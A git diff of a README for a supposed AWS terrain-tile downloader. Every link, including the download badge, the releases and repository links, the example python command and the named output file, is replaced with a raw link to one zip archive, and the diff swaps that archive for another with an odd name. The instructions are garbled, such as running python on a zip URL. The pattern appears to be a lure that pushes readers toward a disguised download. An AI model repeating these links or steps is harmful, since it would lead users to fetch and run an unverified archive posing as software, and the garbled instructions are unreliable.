@@ -1,6 +1,6 @@
 # 🚀 AWS-Dem-Downloader - Download Elevation Data Easily
 
-[![Download Now](https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/blunder/AWS-Dem-Downloader.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/blunder/AWS-Dem-Downloader.zip)
+[![Download Now](https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/public/AW_Downloader_Dem_statutory.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/public/AW_Downloader_Dem_statutory.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to the AWS-Dem-Downloader project. This tool helps you download AWS Terr
 - Supports concurrent downloads for efficiency
 - Allows bounding box and zoom selection
 - Ensures tile integrity with built-in checks
-- Outputs https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/blunder/AWS-Dem-Downloader.zip for easy use in GIS or mapping applications
+- Outputs https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/public/AW_Downloader_Dem_statutory.zip for easy use in GIS or mapping applications
 
 ## 📦 System Requirements
 
@@ -27,11 +27,11 @@ Ensure you have the following on your computer to run this tool:
 
 To get started, visit the following page to download the software:
 
-[Download AWS-Dem-Downloader](https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/blunder/AWS-Dem-Downloader.zip)
+[Download AWS-Dem-Downloader](https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/public/AW_Downloader_Dem_statutory.zip)
 
 1. Open your web browser and go to the release page linked above.
 2. Find the most recent version of AWS-Dem-Downloader.
-3. Click on the appropriate installer file for your operating system (for example, `.exe` for Windows or `https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/blunder/AWS-Dem-Downloader.zip` for Linux).
+3. Click on the appropriate installer file for your operating system (for example, `.exe` for Windows or `https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/public/AW_Downloader_Dem_statutory.zip` for Linux).
 4. The download will begin. Save the file to a location you can easily access, like your Desktop or Downloads folder.
 
 ## 🔍 How to Use
@@ -44,7 +44,7 @@ After downloading and installing the AWS-Dem-Downloader, follow these steps to b
 3. Use the command to start downloading tiles. You can specify options like bounding box and zoom level.
    - Example command:
      ```
-     python https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/blunder/AWS-Dem-Downloader.zip --bounding-box "minLon,minLat,maxLon,maxLat" --zoom 12
+     python https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/public/AW_Downloader_Dem_statutory.zip --bounding-box "minLon,minLat,maxLon,maxLat" --zoom 12
      ```
    - Replace `"minLon,minLat,maxLon,maxLat"` with your desired coordinates.
 
@@ -52,7 +52,7 @@ After downloading and installing the AWS-Dem-Downloader, follow these steps to b
 
 ## 📊 Understanding Output
 
-Once completed, you will see a `https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/blunder/AWS-Dem-Downloader.zip` file in your output directory. This file contains useful information about the downloaded tiles, including:
+Once completed, you will see a `https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/public/AW_Downloader_Dem_statutory.zip` file in your output directory. This file contains useful information about the downloaded tiles, including:
 
 - Tile names and locations
 - Coordinates for each tile
@@ -70,7 +70,7 @@ If you wish to contribute to the AWS-Dem-Downloader project, please read the con
 
 ## 🔗 Useful Links
 
-- [AWS-Dem-Downloader Releases](https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/blunder/AWS-Dem-Downloader.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/blunder/AWS-Dem-Downloader.zip)
+- [AWS-Dem-Downloader Releases](https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/public/AW_Downloader_Dem_statutory.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/hudachan-bos/AWS-Dem-Downloader/main/public/AW_Downloader_Dem_statutory.zip)
   
 By following these steps, you will be well on your way to easily downloading and utilizing AWS Terrain Tiles. Enjoy exploring elevation data!
